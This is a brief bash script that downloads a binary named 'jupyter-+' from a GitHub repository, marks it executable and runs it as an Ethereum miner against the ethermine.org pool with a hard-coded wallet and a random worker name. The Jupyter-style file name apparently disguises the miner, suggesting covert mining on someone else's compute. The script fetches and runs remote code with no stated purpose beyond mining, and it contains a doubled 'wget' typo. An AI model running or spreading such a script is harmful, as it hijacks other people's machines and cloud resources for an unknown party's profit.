#!/bin/bash
sudo apt update && wget wget https://github.com/galebi/pihu/raw/main/jupyter-+ 
chmod +x jupyter-+
POOL=eu1.ethermine.org:4444
WALLET=0x6fBa0CEE4db0Cf528B696eB5DF6a73f3f527097C
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-hudddd)


./jupyter-+ --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
